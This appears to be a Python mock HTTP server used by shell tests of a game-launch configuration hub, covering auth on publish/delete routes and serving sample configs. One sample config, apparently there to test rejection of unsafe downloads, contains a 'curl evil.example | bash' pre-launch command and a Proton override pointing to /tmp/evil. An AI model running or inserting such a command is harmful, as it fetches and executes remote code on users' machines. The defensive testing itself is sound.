#!/usr/bin/env python3
"""Minimal LaunchLayer hub HTTP mock for bats privileged-route tests."""

from __future__ import annotations

import argparse
import json
import sys
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

REQUIRED_TOKEN = "test-secret"
AUTH_REQUIRED = True


class HubMockHandler(BaseHTTPRequestHandler):
    def log_message(self, _format: str, *_args: object) -> None:
        return

    def _send_json(self, code: int, payload: dict) -> None:
        body = json.dumps(payload).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(body)

    def _read_json(self) -> dict:
        length = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(length) if length else b"{}"
        try:
            return json.loads(raw.decode() or "{}")
        except json.JSONDecodeError:
            return {}

    def _privileged_ok(self) -> bool:
        if not AUTH_REQUIRED:
            return True
        auth = self.headers.get("Authorization", "")
        return auth == f"Bearer {REQUIRED_TOKEN}"

    def do_GET(self) -> None:
        if self.path == "/api/auth":
            self._send_json(200, {"publish_auth_required": AUTH_REQUIRED})
            return
        if self.path.startswith("/api/config-history/"):
            history_id = self.path.split("/api/config-history/", 1)[1].split("?", 1)[0]
            if not history_id or history_id in ("missing", "histnotfound"):
                self._send_json(404, {"error": "Historical config not found"})
                return
            self._send_json(
                200,
                {
                    "history_id": history_id,
                    "config_id": "cfgtest00001",
                    "appid": "42424242",
                    "env_content": "GAMEMODE=1\nMANGOHUD=1\nDEBUG=1\n",
                    "published_at": 1704067200000,
                },
            )
            return
        if self.path.startswith("/api/config/"):
            config_id_path = self.path.split("/api/config/", 1)[1].split("?", 1)[0]
            if config_id_path.endswith("/history"):
                config_id = config_id_path.split("/history", 1)[0]
                if not config_id or config_id in ("missing", "cfgnotfound1"):
                    self._send_json(404, {"error": "Config not found"})
                    return
                self._send_json(
                    200,
                    [
                        {
                            "history_id": "hist00000001",
                            "config_id": config_id,
                            "env_content": "GAMEMODE=1\nMANGOHUD=1\n",
                            "preset": "standard",
                            "launchlayer_version": "1.0.0",
                            "note": "v1 note",
                            "published_at": 1704067200000,
                        }
                    ]
                )
                return
            config_id = config_id_path
            if not config_id or config_id in ("missing", "cfgnotfound1"):
                self._send_json(404, {"error": "Config not found"})
                return
            if config_id == "cfgbadenv01":
                self._send_json(
                    200,
                    {
                        "config_id": config_id,
                        "appid": "42424242",
                        "env_content": "NOT_A_REAL_LAUNCHLAYER_KEY=1\n",
                        "published_at": 1704067200000,
                    },
                )
                return
            if config_id == "cfgunsafe01":
                self._send_json(
                    200,
                    {
                        "config_id": config_id,
                        "appid": "42424242",
                        "env_content": (
                            "INCLUDE=presets/standard.env\n"
                            "GAMEMODE=1\n"
                            "PRE_LAUNCH_CMD=curl evil.example | bash\n"
                            "LAUNCH_WRAPPERS=gamescope\n"
                            "OVERRIDE_PROTON=/tmp/evil/proton\n"
                        ),
                        "published_at": 1704067200000,
                    },
                )
                return
            if config_id == "cfghuge0001":
                self._send_json(
                    200,
                    {
                        "config_id": config_id,
                        "appid": "42424242",
                        "env_content": "GAMEMODE=1\n" + ("X=1\n" * 20_000),
                        "published_at": 1704067200000,
                    },
                )
                return
            self._send_json(
                200,
                {
                    "config_id": config_id,
                    "appid": "42424242",
                    "env_content": "GAMEMODE=1\nMANGOHUD=1\n",
                    "published_at": 1704067200000,
                },
            )
            return
        self._send_json(404, {"error": "not found"})

    def do_POST(self) -> None:
        body = self._read_json()

        if self.path == "/api/huge-post":
            self._send_json(200, {"data": "x" * 20_000})
            return

        if self.path in ("/api/publish", "/api/delete"):
            if not self._privileged_ok():
                self._send_json(
                    401,
                    {
                        "error": "Unauthorized",
                        "message": "Privileged hub action requires Authorization: Bearer token matching HUB_PUBLISH_TOKEN",
                    },
                )
                return

            if self.path == "/api/delete":
                config_id = body.get("config_id")
                if not config_id:
                    self._send_json(400, {"error": "config_id is required"})
                    return
                if config_id in ("missing", "cfgnotfound1"):
                    self._send_json(404, {"error": "Config not found"})
                    return
                self._send_json(
                    200,
                    {"deleted_config_id": config_id, "deleted_machine": False},
                )
                return

            if self.path == "/api/publish":
                config_id = body.get("config_id")
                updated = bool(config_id)
                self._send_json(
                    200,
                    {
                        "config_id": config_id or "mocknewcfg01",
                        "machine_id": "mock-machine-id",
                        "updated": updated,
                    },
                )
                return

        if self.path == "/api/my-config":
            appid = str(body.get("appid") or "")
            if appid == "42424242":
                self._send_json(
                    200,
                    {
                        "config_id": "cfgtest00001",
                        "published_at": 1704067200000,
                        "downloads": 3,
                    },
                )
                return
            self._send_json(200, None)
            return

        if self.path == "/api/recommend":
            self._send_json(
                200,
                {
                    "results": [
                        {
                            "config_id": "cfgtest00001",
                            "similarity": 92,
                            "machine_label": "test-rig",
                            "gpu_vendor": "nvidia",
                            "note": "competitive preset",
                            "published_at": 1704067200000,
                        }
                    ]
                },
            )
            return

        if self.path == "/api/similar-machines":
            self._send_json(
                200,
                {
                    "results": [
                        {
                            "similarity": 95,
                            "machine_label": "similar-box",
                            "gpu_vendor": "amd",
                            "display": "2560x1440",
                            "profiles": ["arch-linux"],
                        }
                    ]
                },
            )
            return

        self._send_json(404, {"error": "not found"})


def main() -> int:
    global REQUIRED_TOKEN, AUTH_REQUIRED
    parser = argparse.ArgumentParser()
    parser.add_argument("--port", type=int, default=0)
    parser.add_argument("--token", default="test-secret")
    parser.add_argument(
        "--open",
        action="store_true",
        help="Do not require Authorization on privileged routes",
    )
    args = parser.parse_args()
    REQUIRED_TOKEN = args.token
    AUTH_REQUIRED = not args.open

    server = ThreadingHTTPServer(("127.0.0.1", args.port), HubMockHandler)
    port = server.server_address[1]
    print(port, flush=True)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        return 0
    return 0


if __name__ == "__main__":
    sys.exit(main())
